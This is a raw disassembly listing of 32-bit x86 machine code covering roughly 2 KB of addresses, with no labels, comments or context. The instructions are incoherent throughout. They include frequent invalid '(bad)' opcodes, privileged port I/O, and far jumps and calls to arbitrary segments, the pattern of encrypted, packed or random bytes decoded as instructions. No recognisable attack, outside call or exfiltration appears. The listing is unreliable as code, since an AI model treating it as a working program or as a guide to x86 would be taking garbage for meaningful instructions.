  404225:	mov    esi,0x1cf43ba8
  40422a:	xor    al,0xbb
  40422c:	out    0x34,eax
  40422e:	sub    al,bh
  404230:	mov    bh,0x32
  404232:	inc    esp
  404233:	mov    cl,0xc0
  404235:	or     eax,0xd46acb6a
  40423a:	cmp    BYTE PTR [esi+edi*8],dh
  40423d:	sub    ecx,ebx
  40423f:	mov    ds:0x141a7486,al
  404244:	(bad)  
  404245:	push   esi
  404246:	mov    bh,0x18
  404248:	jmp    0x40428d
  40424a:	inc    edi
  40424b:	ja     0x4042ab
  40424d:	clc    
  40424e:	jge    0x4041fb
  404250:	pop    ss
  404251:	cmp    edi,DWORD PTR [esi+0x74]
  404254:	ret    0x9a7b
  404257:	into   
  404258:	pop    eax
  404259:	and    BYTE PTR [ecx],al
  40425b:	push   cs
  40425c:	shl    eax,cl
  40425e:	mov    bl,0x1b
  404260:	fdiv   DWORD PTR [ecx-0x39]
  404263:	xor    ch,BYTE PTR [ecx-0x3577edb4]
  404269:	ficom  WORD PTR [eax-0x52]
  40426c:	push   0x26bf315
  404271:	adc    eax,DWORD PTR [edx+0x54]
  404274:	ret    
  404275:	mov    cl,0xaa
  404277:	lahf   
  404278:	ja     0x40428e
  40427a:	mov    DWORD PTR ds:0x257447b4,eax
  404280:	ret    0xfcbd
  404283:	dec    ebx
  404284:	std    
  404285:	jnp    0x404281
  404287:	and    DWORD PTR [edi+0x596780e],edi
  40428d:	adc    edi,DWORD PTR [esi+0x31]
  404290:	push   ebp
  404291:	and    DWORD PTR [ebx+0x19],esp
  404294:	sub    al,0x82
  404296:	bound  ecx,QWORD PTR [edi-0x1320f1d]
  40429c:	push   ecx
  40429d:	stos   DWORD PTR es:[edi],eax
  40429e:	arpl   WORD PTR [ebx],cx
  4042a0:	mov    dh,0xa8
  4042a2:	xchg   ebp,eax
  4042a3:	scas   eax,DWORD PTR es:[edi]
  4042a4:	rol    BYTE PTR [edi-0x76971178],cl
  4042aa:	xor    al,0xd3
  4042ac:	mov    esi,0x2bbba658
  4042b1:	sub    ch,BYTE PTR [eax+0xb]
  4042b4:	fs hlt 
  4042b6:	mov    bh,0xe9
  4042b8:	scas   al,BYTE PTR es:[edi]
  4042b9:	stc    
  4042ba:	mov    bl,0x6a
  4042bc:	in     eax,dx
  4042bd:	sub    BYTE PTR [esi-0x18],bl
  4042c0:	test   eax,0xb13d1c3
  4042c5:	pusha  
  4042c6:	jle    0x40429b
  4042c8:	inc    ecx
  4042c9:	cmp    al,0x9c
  4042cb:	xor    BYTE PTR [eax-0x71],0xa0
  4042cf:	shr    ah,cl
  4042d1:	mov    fs,WORD PTR [eax]
  4042d3:	gs imul edx,edi,0xffffffed
  4042d7:	out    dx,al
  4042d8:	(bad)  
  4042d9:	cmp    al,0x86
  4042db:	cld    
  4042dc:	cs cmp ebp,ebx
  4042df:	mov    eax,0x849656ac
  4042e4:	mov    ebx,0x5424f674
  4042e9:	inc    edi
  4042ea:	sub    esp,ebx
  4042ec:	(bad)  
  4042ed:	ficomp WORD PTR [edi-0x3c]
  4042f0:	div    DWORD PTR [ebx-0x35bb890f]
  4042f6:	push   esp
  4042f7:	int3   
  4042f8:	sub    al,0xbd
  4042fa:	adc    DWORD PTR [ebx],ebx
  4042fc:	std    
  4042fd:	push   eax
  4042fe:	adc    al,0xd0
  404300:	data16 mov dl,0x2b
  404303:	xchg   ecx,eax
  404304:	ins    BYTE PTR es:[edi],dx
  404305:	int    0xb0
  404307:	mov    BYTE PTR [eax],bl
  404309:	sub    eax,ebx
  40430b:	daa    
  40430c:	call   0x8f98f8a9
  404311:	pop    es
  404312:	lahf   
  404313:	pop    esi
  404314:	add    ecx,ebp
  404316:	mov    eax,ds:0x26793ebe
  40431b:	mov    ecx,0x4b7cccba
  404320:	mov    ch,0x4f
  404322:	aad    0xbf
  404324:	mov    BYTE PTR [edx+0x7c],bh
  404327:	popf   
  404328:	jge    0x4042bb
  40432a:	sbb    BYTE PTR [ecx+0x5e7f1b22],bl
  404330:	sbb    esi,ebx
  404332:	bound  esp,QWORD PTR [eax]
  404334:	pop    esp
  404335:	push   ss
  404336:	out    dx,al
  404337:	mov    ecx,?
  404339:	(bad)
  40433d:	xor    eax,0xc5e01254
  404342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404343:	push   es
  404344:	arpl   WORD PTR [esi],sp
  404346:	and    edi,edi
  404348:	ss pushf 
  40434a:	sbb    DWORD PTR [edx+0x21],ecx
  40434d:	cs jmp 0x636a1b02
  404353:	mov    ds:0x87f422f3,eax
  404358:	out    dx,al
  404359:	in     al,0xd
  40435b:	cmp    DWORD PTR [edx-0x226feae5],ecx
  404361:	jns    0x404363
  404363:	mov    ch,0x5c
  404365:	add    bh,BYTE PTR [edx+0x40]
  404368:	(bad)  
  404369:	adc    edx,DWORD PTR [ebx-0x24]
  40436c:	outs   dx,BYTE PTR ds:[esi]
  40436d:	mov    ds:0x8c9a05fe,al
  404372:	mov    ch,0x97
  404374:	ficomp WORD PTR [eax-0x17]
  404377:	pop    ss
  404378:	cdq    
  404379:	add    al,0x46
  40437b:	nop
  40437c:	pop    ebp
  40437d:	inc    esi
  40437e:	or     DWORD PTR [eax+0x21],ecx
  404381:	jge    0x404361
  404383:	or     cl,BYTE PTR [edi]
  404385:	sar    BYTE PTR [ebp-0x22],1
  404388:	mov    ch,0x1d
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	fcomp  QWORD PTR [eax]
  40438d:	jmp    0x40433c
  40438f:	pop    ecx
  404390:	pop    esi
  404391:	sahf   
  404392:	add    ecx,esp
  404394:	jo     0x404343
  404396:	jno    0x404355
  404398:	jo     0x40431f
  40439a:	cmp    esp,DWORD PTR [esi]
  40439c:	inc    eax
  40439d:	sub    DWORD PTR [eax-0x7d4d2053],edx
  4043a3:	into   
  4043a4:	mov    edx,0xf1a1085
  4043a9:	(bad)  
  4043aa:	push   edx
  4043ab:	repnz fisttp DWORD PTR [edx]
  4043ae:	sub    cl,BYTE PTR [edi-0x21b9bb93]
  4043b4:	sbb    eax,0xb763c621
  4043b9:	mov    edx,0xeebb0275
  4043be:	lea    edx,[esp+esi*4+0x63839884]
  4043c5:	xchg   cl,bh
  4043c7:	sub    ebp,0xffffffc0
  4043ca:	scas   al,BYTE PTR es:[edi]
  4043cb:	or     al,0x17
  4043cd:	les    ebp,FWORD PTR [ebx+ebp*8]
  4043d0:	daa    
  4043d1:	mov    al,ds:0x60325ff
  4043d6:	xchg   esp,eax
  4043d7:	mov    edi,0xa328b56a
  4043dc:	mov    edi,0x53dab849
  4043e1:	mov    eax,DWORD PTR [ebx]
  4043e3:	out    dx,eax
  4043e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e5:	iret   
  4043e6:	repnz jmp 0xdc09:0x9f878a0
  4043ee:	xor    al,0x8f
  4043f0:	sar    BYTE PTR [edi+0x16],0xe9
  4043f4:	sub    DWORD PTR [esi],0x6b
  4043f7:	jge    0x404428
  4043f9:	dec    ebx
  4043fa:	push   es
  4043fb:	mul    BYTE PTR [ebp+ebp*4+0x132a4632]
  404402:	cs mov ecx,0xf5befc51
  404408:	add    BYTE PTR [esi+edx*8+0x51280b91],al
  40440f:	(bad)  
  404410:	test   ah,0x9c
  404413:	arpl   WORD PTR [esi],sp
  404415:	repz cli 
  404417:	int3   
  404418:	push   es
  404419:	out    0x13,al
  40441b:	in     al,dx
  40441c:	nop
  40441d:	push   ss
  40441e:	dec    esp
  40441f:	loope  0x4043f8
  404421:	mov    BYTE PTR [eax],ch
  404423:	mov    DWORD PTR [edx+eax*1-0x34548ce9],ebx
  40442a:	and    al,bh
  40442c:	imul   eax,DWORD PTR [edx+0x7b0f90fe],0x75
  404433:	loopne 0x404466
  404435:	test   eax,0x7f56ca76
  40443a:	and    al,0x10
  40443c:	icebp  
  40443d:	imul   edi,esi,0xffffffac
  404440:	sub    DWORD PTR [edi+0x4a8d6f8c],ebp
  404446:	mov    ebp,0x9c732507
  40444b:	pusha  
  40444c:	mov    ebx,eax
  40444e:	jno    0x404405
  404450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404451:	pop    ss
  404452:	sti    
  404453:	(bad)  
  404454:	ficomp WORD PTR [ebp-0x77]
  404457:	ja     0x404459
  404459:	out    dx,eax
  40445a:	inc    edi
  40445b:	inc    ebp
  40445c:	(bad)  
  40445d:	and    BYTE PTR [ecx+ebx*8],dl
  404460:	arpl   cx,sp
  404462:	xor    dh,ch
  404464:	or     al,0xd5
  404466:	or     DWORD PTR ds:0x66d49da8,esi
  40446c:	cdq    
  40446d:	and    DWORD PTR [eax],0x40
  404470:	cs sar al,0x4c
  404474:	mov    DWORD PTR [edi-0x40],ebp
  404477:	cmp    ah,BYTE PTR [eax-0x1011e23c]
  40447d:	and    DWORD PTR [esi+0x65],ebp
  404480:	mov    DWORD PTR [ebp+0x61],ebp
  404483:	sbb    DWORD PTR [ecx+edx*4-0x349efcb5],0x3
  40448b:	aaa    
  40448c:	retf   0x58b1
  40448f:	leave  
  404490:	popa   
  404491:	(bad)  
  404492:	into   
  404493:	lods   eax,DWORD PTR ds:[esi]
  404494:	xchg   al,al
  404496:	imul   edi,DWORD PTR [esi+eiz*2-0x36f4cfec],0x9a0080fb
  4044a1:	add    dl,BYTE PTR [edx+0x106a1ed1]
  4044a7:	popa   
  4044a8:	pop    DWORD PTR fs:[edx]
  4044ab:	mov    dl,0x75
  4044ad:	cwde   
  4044ae:	imul   edi,ebp,0xc5285e10
  4044b4:	(bad)  
  4044b5:	fdiv   DWORD PTR [edi]
  4044b7:	out    0x6d,al
  4044b9:	arpl   WORD PTR [eax-0x7b46e044],sp
  4044bf:	xchg   ebx,ebx
  4044c1:	xchg   ebp,eax
  4044c2:	iret   
  4044c3:	push   esi
  4044c4:	push   edi
  4044c5:	lock jne 0x404462
  4044c8:	gs mov cl,0x35
  4044cb:	add    al,BYTE PTR [ebp+0x48a49066]
  4044d1:	or     bh,cl
  4044d3:	fwait
  4044d4:	mov    dl,bl
  4044d6:	dec    edx
  4044d7:	ss call 0x3fb185dc
  4044dd:	cvtps2pd xmm1,xmm3
  4044e0:	icebp  
  4044e1:	xlat   BYTE PTR ds:[ebx]
  4044e2:	cvtps2pd xmm0,QWORD PTR [edi-0xa]
  4044e6:	xchg   edi,eax
  4044e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e8:	dec    ebx
  4044e9:	retf   0x1c75
  4044ec:	fs scas eax,DWORD PTR es:[edi]
  4044ee:	inc    ebp
  4044ef:	pop    ebx
  4044f0:	in     al,dx
  4044f1:	and    DWORD PTR [ecx+eax*8],0xffffff9a
  4044f5:	push   ecx
  4044f6:	aas    
  4044f7:	out    dx,al
  4044f8:	inc    eax
  4044f9:	int3   
  4044fa:	fisttp WORD PTR [ecx]
  4044fc:	inc    eax
  4044fd:	push   edx
  4044fe:	arpl   WORD PTR [esi-0x220f989f],si
  404504:	and    dl,cl
  404506:	push   ecx
  404507:	jno    0x404494
  404509:	jle    0x404575
  40450b:	ja     0x404542
  40450d:	mov    ecx,0x7d495e98
  404512:	std    
  404513:	push   0x14
  404515:	xchg   edx,eax
  404516:	sbb    eax,0xd5c7ab70
  40451b:	aad    0x48
  40451d:	jo     0x4044ed
  40451f:	xchg   ebp,eax
  404520:	sahf   
  404521:	jb     0x4044c1
  404523:	push   ecx
  404524:	inc    ebx
  404525:	dec    eax
  404526:	cmp    al,0x9a
  404528:	mov    dl,0xf7
  40452a:	aad    0x4a
  40452c:	dec    esi
  40452d:	dec    ebx
  40452e:	sub    al,0x1b
  404530:	jg     0x40455e
  404532:	mov    ebp,0x386cac62
  404537:	dec    edi
  404538:	je     0x404545
  40453a:	mov    edi,0x60edc663
  40453f:	xchg   dh,al
  404541:	pop    ss
  404542:	call   0x8b4a2860
  404547:	xchg   BYTE PTR [eax+0x32],bh
  40454a:	push   edx
  40454b:	fcomp  DWORD PTR [ecx]
  40454d:	mov    dh,0x2c
  40454f:	push   ebx
  404550:	mov    ds:0xf920ef47,al
  404555:	adc    ecx,0xd84f724
  40455b:	(bad)  [esp+ebp*1+0x44]
  40455f:	(bad)  
  404560:	mov    ebx,ds
  404562:	fwait
  404563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404564:	jl     0x404579
  404566:	and    eax,0x678cc68
  40456b:	outs   dx,BYTE PTR ds:[esi]
  40456c:	mov    ecx,0x583030b4
  404571:	add    esp,DWORD PTR [esi]
  404573:	iret   
  404574:	jle    0x40456f
  404576:	inc    ebx
  404577:	lahf   
  404578:	dec    ebp
  404579:	out    dx,eax
  40457a:	das    
  40457b:	les    ecx,FWORD PTR [edx]
  40457d:	pop    ebp
  40457e:	mov    edx,0x1012b8e
  404583:	inc    edi
  404584:	adc    esp,eax
  404586:	(bad)  
  404587:	scas   al,BYTE PTR es:[edi]
  404588:	loopne 0x404534
  40458a:	sti    
  40458b:	jecxz  0x4045bd
  40458d:	daa    
  40458e:	(bad)  
  40458f:	xchg   ebx,eax
  404590:	in     al,dx
  404591:	cli    
  404592:	scas   al,BYTE PTR es:[edi]
  404593:	add    al,0xa4
  404595:	repz das 
  404597:	add    BYTE PTR [esi],0x6f
  40459a:	add    ecx,DWORD PTR [ebp*8-0x584ccded]
  4045a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a2:	jecxz  0x404549
  4045a4:	or     ebx,edx
  4045a6:	and    al,BYTE PTR [ebx]
  4045a8:	push   ss
  4045a9:	add    eax,esp
  4045ab:	ja     0x4045d7
  4045ad:	sbb    ebp,DWORD PTR [ebx+0x5a]
  4045b0:	js     0x4045b7
  4045b2:	(bad)  
  4045b3:	aaa    
  4045b4:	mov    esp,0xc2563f23
  4045b9:	fcmovne st,st(1)
  4045bb:	mov    WORD PTR [eax+edx*4+0x151ba7e0],cs
  4045c2:	push   esp
  4045c3:	(bad)  
  4045c4:	shl    edi,1
  4045c6:	xor    dl,bl
  4045c8:	repnz and DWORD PTR [ecx],ebp
  4045cb:	sahf   
  4045cc:	mov    edx,0x56dc5969
  4045d1:	fld    DWORD PTR [ecx-0x49ccfbfa]
  4045d7:	dec    ebx
  4045d8:	sbb    ah,BYTE PTR [esi+0x5f81edb8]
  4045de:	inc    ebx
  4045df:	sbb    ecx,DWORD PTR [eax+0x3851a2cf]
  4045e5:	adc    BYTE PTR [ecx-0x37],0x86
  4045e9:	xor    al,0x15
  4045eb:	mov    ecx,0xfbf763cd
  4045f0:	jp     0x40459a
  4045f2:	call   0xb3e7:0x3a790739
  4045f9:	ror    BYTE PTR [ecx-0x56],1
  4045fc:	cdq    
  4045fd:	fs mov esp,0x3bf5a54d
  404603:	mov    ds,WORD PTR [edx]
  404605:	out    dx,eax
  404606:	mov    ah,0x4f
  404608:	test   BYTE PTR gs:[ecx-0x59],al
  40460c:	scas   al,BYTE PTR es:[edi]
  40460d:	outs   dx,DWORD PTR ds:[esi]
  40460e:	add    edi,DWORD PTR [ecx+0x7c839261]
  404614:	xchg   esi,eax
  404615:	push   0x7a
  404617:	cmc    
  404618:	arpl   WORD PTR [esi],si
  40461a:	ficom  DWORD PTR [ecx+0x73]
  40461d:	push   ebp
  40461e:	arpl   WORD PTR [edi+0x2a],di
  404621:	inc    ebp
  404622:	test   al,0x7b
  404624:	sub    eax,0xcca827d5
  404629:	stos   BYTE PTR es:[edi],al
  40462a:	sbb    ebp,DWORD PTR [edx]
  40462c:	jb     0x4045af
  40462e:	loopne 0x40461e
  404630:	outs   dx,DWORD PTR ds:[esi]
  404631:	js     0x4af75798
  404637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404638:	mov    ah,0x34
  40463a:	stc    
  40463b:	sub    BYTE PTR [eax+0x5c],dl
  40463e:	cmp    dh,dl
  404640:	rcl    ch,0xcc
  404643:	jp     0x4045da
  404645:	out    dx,eax
  404646:	stos   BYTE PTR es:[edi],al
  404647:	test   BYTE PTR [ebp-0x5629e08e],0xc
  40464e:	retf   0xfb23
  404651:	popf   
  404652:	test   BYTE PTR [ecx-0x7f],0x36
  404656:	adc    edi,edi
  404658:	pop    esi
  404659:	ds js  0x404689
  40465c:	in     eax,dx
  40465d:	pop    edi
  40465e:	call   0x682e:0xdbbdc3b7
  404665:	repz xchg di,ax
  404668:	repz (bad) 
  40466a:	iret   
  40466b:	(bad)  
  40466c:	fisub  DWORD PTR [ecx-0x72]
  40466f:	pop    edi
  404670:	addr16 cwde 
  404672:	push   ebp
  404673:	jno    0x404663
  404675:	nop
  404676:	dec    eax
  404677:	xchg   ebx,eax
  404678:	dec    edx
  404679:	ficom  WORD PTR [ecx+0x6f]
  40467c:	mov    ebp,0x8c663040
  404681:	cmp    BYTE PTR [ebp-0x242507e8],ah
  404687:	fwait
  404688:	jle    0x4046c7
  40468a:	bound  esp,QWORD PTR [esi]
  40468c:	dec    eax
  40468d:	mov    eax,0x72f30432
  404692:	push   edx
  404693:	call   0x87a6aa23
  404698:	mov    ecx,ss
  40469a:	adc    bl,ah
  40469c:	outs   dx,BYTE PTR ds:[esi]
  40469d:	and    edx,ebp
  40469f:	shr    edx,1
  4046a1:	loopne 0x4046ac
  4046a3:	sbb    dh,cl
  4046a5:	enter  0xab23,0x4
  4046a9:	jo     0x404666
  4046ab:	sti    
  4046ac:	jle    0x40471d
  4046ae:	mov    edi,0x46f0efe4
  4046b3:	mov    edx,0xa4555778
  4046b8:	fadd   st,st(2)
  4046ba:	lods   eax,DWORD PTR ds:[esi]
  4046bb:	cmp    eax,0x8f0ac208
  4046c0:	add    dl,BYTE PTR ds:0x2291a90b
  4046c6:	sbb    eax,0x8d6ac409
  4046cb:	icebp  
  4046cc:	aad    0x46
  4046ce:	mov    ds:0x7671078c,al
  4046d3:	push   cs
  4046d4:	mov    dh,0x7d
  4046d6:	fld    TBYTE PTR ds:0x93ded92e
  4046dc:	sbb    dh,BYTE PTR [ebp+0x67b577ee]
  4046e2:	out    0xbb,al
  4046e4:	mov    cl,BYTE PTR [eax-0x487b0db5]
  4046ea:	cmp    bl,BYTE PTR [esi+0x1da93c4e]
  4046f0:	hlt    
  4046f1:	xchg   BYTE PTR [esi],ch
  4046f3:	cli    
  4046f4:	shl    DWORD PTR [ebx+0x3b54c694],cl
  4046fa:	out    0x61,eax
  4046fc:	repnz adc eax,0xb397bb87
  404702:	in     al,dx
  404703:	dec    edx
  404704:	cmp    dl,BYTE PTR [ebx-0x61]
  404707:	pushf  
  404708:	test   al,0x17
  40470a:	cwde   
  40470b:	xchg   ebp,eax
  40470c:	inc    ecx
  40470d:	ins    DWORD PTR es:[edi],dx
  40470e:	fs ins DWORD PTR es:[edi],dx
  404710:	test   BYTE PTR [ebx],0xad
  404713:	rcr    DWORD PTR [ebx-0x4a],0x6f
  404717:	push   edi
  404718:	fs mov eax,0xc8722b51
  40471e:	xor    ebx,DWORD PTR [ebp-0x4a]
  404721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404722:	loope  0x4046da
  404724:	add    DWORD PTR [edx],esi
  404726:	cmp    BYTE PTR [ecx],bh
  404728:	popa   
  404729:	dec    eax
  40472a:	lds    ecx,FWORD PTR [edx]
  40472c:	fwait
  40472d:	ret    
  40472e:	into   
  40472f:	fcomp  st(7)
  404731:	add    DWORD PTR [ecx-0x3f],edi
  404734:	or     BYTE PTR [edx-0x28],ch
  404737:	mov    dl,0x86
  404739:	add    al,0x7a
  40473b:	and    eax,0xa2fdc142
  404740:	sub    al,0xec
  404742:	fdiv   st(0),st
  404744:	call   0x957d:0x6f7f5f12
  40474b:	ds out 0xf6,al
  40474e:	mov    ch,0x90
  404750:	mov    al,ds:0x82fed6f2
  404755:	stos   DWORD PTR es:[edi],eax
  404756:	clc    
  404757:	pop    es
  404758:	shl    DWORD PTR [bp-0x20],1
  40475c:	iret   
  40475d:	jb     0x404730
  40475f:	xchg   DWORD PTR [eax-0x73],edi
  404762:	inc    esp
  404763:	cmp    ch,BYTE PTR [esp+edi*8+0x40]
  404767:	adc    esp,edx
  404769:	test   DWORD PTR [eax],esp
  40476b:	pop    ebx
  40476c:	cmc    
  40476d:	push   cs
  40476e:	in     eax,0x65
  404770:	or     esp,eax
  404772:	mov    esp,0xac8a0465
  404777:	mov    al,ds:0xda15f4e3
  40477c:	ret    
  40477d:	and    BYTE PTR [ebp-0x1f],ch
  404780:	ss pop esi
  404782:	jb     0x4047c6
  404784:	test   al,0x56
  404786:	adc    esp,edx
  404788:	pop    es
  404789:	sbb    edi,ebx
  40478b:	idiv   DWORD PTR [edi]
  40478d:	add    eax,0xb6af7e29
  404792:	push   edx
  404793:	jp     0x4047c6
  404795:	dec    ecx
  404796:	shl    DWORD PTR [edx],0xe
  404799:	popf   
  40479a:	or     ch,bl
  40479c:	pop    es
  40479d:	aaa    
  40479e:	adc    ecx,eax
  4047a0:	add    DWORD PTR [esp+eax*4+0x564c47d4],edx
  4047a7:	jmp    0xedfa:0x47d1f91c
  4047ae:	ret    
  4047af:	push   esp
  4047b0:	add    eax,0xc0d4c9c
  4047b5:	ins    DWORD PTR es:[edi],dx
  4047b6:	call   0x4794665c
  4047bb:	mov    ebp,0x308c0cd4
  4047c1:	pop    ebx
  4047c2:	push   edx
  4047c3:	xor    bl,BYTE PTR [eax-0x164f852d]
  4047c9:	aad    0xdf
  4047cb:	aad    0x9d
  4047cd:	pop    ss
  4047ce:	icebp  
  4047cf:	stc    
  4047d0:	sbb    BYTE PTR [esi],0x59
  4047d3:	pusha  
  4047d4:	(bad)
  4047d8:	fiadd  WORD PTR [esi+0x37d43d30]
  4047de:	jno    0x40485d
  4047e0:	push   cs
  4047e1:	jl     0x4047b3
  4047e3:	xchg   ebx,eax
  4047e4:	sub    al,0x10
  4047e6:	jecxz  0x404865
  4047e8:	pop    ds
  4047e9:	add    eax,0xa654c494
  4047ee:	sbb    eax,0xb2045e90
  4047f3:	rcl    DWORD PTR [ebx],cl
  4047f5:	shl    BYTE PTR [edx],1
  4047f7:	in     eax,0xc2
  4047f9:	and    edi,edx
  4047fb:	mov    al,ds:0x8086b807
  404800:	jle    0x4047ba
  404802:	xor    al,0x8c
  404804:	or     al,0xf4
  404806:	dec    DWORD PTR [ebp-0xf]
  404809:	and    esi,esp
  40480b:	and    al,0x63
  40480d:	loopne 0x40486c
  40480f:	(bad)  
  404810:	stos   DWORD PTR es:[edi],eax
  404811:	shl    ah,0x4a
  404814:	xor    al,0x8b
  404816:	out    0xe0,al
  404818:	nop
  404819:	sub    BYTE PTR [ebx-0x4b],0x55
  40481d:	xchg   edi,eax
  40481e:	adc    dl,bl
  404820:	and    ecx,DWORD PTR [ebx-0x3f88686b]
  404826:	xor    al,0x83
  404828:	out    dx,eax
  404829:	scas   al,BYTE PTR es:[edi]
  40482a:	lods   eax,DWORD PTR ds:[esi]
  40482b:	in     eax,dx
  40482c:	adc    al,bh
  40482e:	ret    0xb47
  404831:	mov    bl,0x3e
  404833:	push   ss
  404834:	daa    
  404835:	cmp    eax,0xadbee2e8
  40483a:	lods   eax,DWORD PTR ds:[esi]
  40483b:	rep ins DWORD PTR es:[edi],dx
  40483d:	inc    esp
  40483e:	inc    edi
  40483f:	enter  0x1426,0xf4
  404843:	(bad)  
  404844:	jge    0x404857
  404846:	mov    al,ds:0xeeea9e7d
  40484b:	mov    dh,0x22
  40484d:	outs   dx,DWORD PTR ds:[esi]
  40484e:	sbb    ch,BYTE PTR [eax-0x2c3dfff]
  404854:	sahf   
  404855:	jae    0x404867
  404857:	call   0x6fd4c01a
  40485c:	jo     0x404852
  40485e:	or     al,0x9c
  404860:	mov    bh,0x8e
  404862:	adc    eax,0x55b3898b
  404867:	pop    ecx
  404868:	push   es
  404869:	mov    edx,0x612c961c
  40486e:	leave  
  40486f:	xor    al,BYTE PTR [edx]
  404871:	push   0xef807f8
  404876:	or     ebx,ecx
  404878:	and    DWORD PTR [ebp+eax*8-0x2a],edx
  40487c:	out    0x71,al
  40487e:	sub    BYTE PTR [esi+0x34],al
  404881:	sub    DWORD PTR [edx-0x444299df],0x52
  404888:	dec    edi
  404889:	jb     0x40488b
  40488b:	ficomp DWORD PTR [ebx]
  40488d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488e:	leave  
  40488f:	jecxz  0x4048dd
  404891:	loopne 0x404821
  404893:	adc    ecx,DWORD PTR [edx+0x2aa95b1b]
  404899:	push   ecx
  40489a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40489b:	out    0xb4,eax
  40489d:	hlt    
  40489e:	cli    
  40489f:	dec    ebx
  4048a0:	addr16 pop es
  4048a2:	push   eax
  4048a3:	and    DWORD PTR [ecx],edi
  4048a5:	add    ah,BYTE PTR ds:0x129776a3
  4048ab:	jno    0x4048bc
  4048ad:	dec    eax
  4048ae:	ficomp DWORD PTR [edx+0x62]
  4048b1:	or     ecx,DWORD PTR [esi]
  4048b3:	mov    ds:0x9e37208d,eax
  4048b8:	mov    cl,ch
  4048ba:	inc    edi
  4048bb:	pop    eax
  4048bc:	mov    edi,0xaa6ce1db
  4048c1:	idiv   DWORD PTR [edx+0x6a94a4be]
  4048c7:	mov    DWORD PTR [edx],esi
  4048c9:	inc    edi
  4048ca:	ror    DWORD PTR [edi+0x70],cl
  4048cd:	sbb    eax,0xb5188c42
  4048d2:	mov    ?,WORD PTR [esi+0x30]
  4048d5:	ret    0x8da8
  4048d8:	add    edx,0x9732fd08
  4048de:	jl     0x404874
  4048e0:	in     al,0x47
  4048e2:	push   0x1e8e1dd2
  4048e7:	(bad)  
  4048e8:	out    dx,eax
  4048e9:	test   eax,0xd3e91895
  4048ee:	fisubr DWORD PTR [ebp-0x40]
  4048f1:	fs cmc 
  4048f3:	dec    eax
  4048f4:	cmp    al,0xfb
  4048f6:	and    al,0x9f
  4048f8:	rcl    eax,1
  4048fa:	adc    bh,dh
  4048fc:	mov    cs,WORD PTR [ebx]
  4048fe:	shl    BYTE PTR [esi],0xff
  404901:	pop    ebp
  404902:	xchg   DWORD PTR [esi+0xb],ebx
  404905:	jbe    0x40489d
  404907:	js     0x4048f8
  404909:	cmp    dh,BYTE PTR [edi]
  40490b:	daa    
  40490c:	or     eax,0x93778d97
  404911:	enter  0x9e09,0xcc
  404915:	xchg   DWORD PTR [eax+0x6c4d8b4e],edx
  40491b:	mov    al,ds:0xa6946a7
  404920:	inc    ecx
  404921:	xchg   ecx,eax
  404922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404923:	adc    al,0x74
  404925:	lods   al,BYTE PTR ds:[esi]
  404926:	sbb    DWORD PTR [ebp+0x6de5af4e],0x9
  40492d:	ret    
  40492e:	fwait
  40492f:	sub    ecx,DWORD PTR [edx+ebx*4]
  404932:	in     eax,dx
  404933:	mov    ch,0x39
  404935:	test   eax,0x35f9f7ff
  40493a:	pop    esi
  40493b:	and    al,0x2b
  40493d:	sub    al,0xef
  40493f:	push   0xc3ee325e
  404944:	scas   eax,DWORD PTR es:[edi]
  404945:	fsub   DWORD PTR [ecx+eiz*8]
  404948:	mov    ebx,ecx
  40494a:	xchg   ecx,eax
  40494b:	rcl    BYTE PTR ds:0xda3b75c0,cl
  404951:	or     bl,ch
  404953:	shl    BYTE PTR [ebx],cl
  404955:	sar    BYTE PTR ds:0x16e11fb,cl
  40495b:	ja     0x40494b
  40495d:	into   
  40495e:	ficom  DWORD PTR [esi-0x17f23b9]
  404964:	stc    
  404965:	scas   al,BYTE PTR es:[edi]
  404966:	loope  0x404963
  404968:	sbb    dl,ah
  40496a:	aaa    
  40496b:	mov    ds:0x8eb24be0,eax
  404970:	jle    0x4049c3
  404972:	sbb    bl,ah
  404974:	dec    esp
  404975:	inc    eax
  404976:	sbb    bh,BYTE PTR gs:[edi+0x38]
  40497a:	jns    0x40499e
  40497c:	pusha  
  40497d:	adc    eax,0xda93afbb
  404982:	dec    esp
  404983:	shr    BYTE PTR [edx+ebx*2+0x45d2e672],cl
  40498a:	sbb    eax,0xf040880d
  40498f:	push   eax
  404990:	rol    BYTE PTR [edi+0x7e9ee940],1
  404996:	xlat   BYTE PTR ds:[ebx]
  404997:	sub    ebp,ebx
  404999:	jp     0x4049e9
  40499b:	js     0x40493c
  40499d:	jne    0x4049b0
  40499f:	ret    0xf87b
  4049a2:	xchg   edx,eax
  4049a3:	mov    al,ds:0x76c702fa
  4049a8:	jmp    0x6988:0x6029b632
  4049af:	and    DWORD PTR [eax],0x38
  4049b2:	ins    BYTE PTR es:[edi],dx
  4049b3:	push   esi
  4049b4:	retf   0x99ce
  4049b7:	rcr    BYTE PTR ds:0x2a54855c,cl
  4049bd:	cmp    esi,eax
  4049bf:	out    dx,al
  4049c0:	add    eax,0xb2193dcd
  4049c5:	add    esp,DWORD PTR es:[ebp+0x375faf28]
  4049cc:	mov    bp,0x28e7
  4049d0:	test   bh,0x97
  4049d3:	add    DWORD PTR [ebp-0x18308933],0x623c0925
  4049dd:	jmp    0x995e:0x5d10b417
  4049e4:	jmp    0x2148:0x2a1a6f78
  4049eb:	retf   
  4049ec:	outs   dx,DWORD PTR ds:[esi]
  4049ed:	call   0xa26c4149
  4049f2:	push   0x75c37f6b
  4049f7:	fnsave [ebp+0x54]
  4049fa:	sbb    edi,ebx
  4049fc:	push   esi
  4049fd:	inc    esp
  4049fe:	nop
  4049ff:	ins    DWORD PTR es:[edi],dx
  404a00:	loop   0x404a35
  404a02:	push   ecx
  404a03:	out    0x35,eax
  404a05:	(bad)
  404a08:	mov    ds:0xef55c88e,al
  404a0d:	sti    
  404a0e:	test   al,0x70
  404a10:	loopne 0x404a05
  404a12:	retf   
  404a13:	sub    al,0xe1
  404a15:	les    edi,FWORD PTR [eax-0x5d249ee0]
  404a1b:	das    
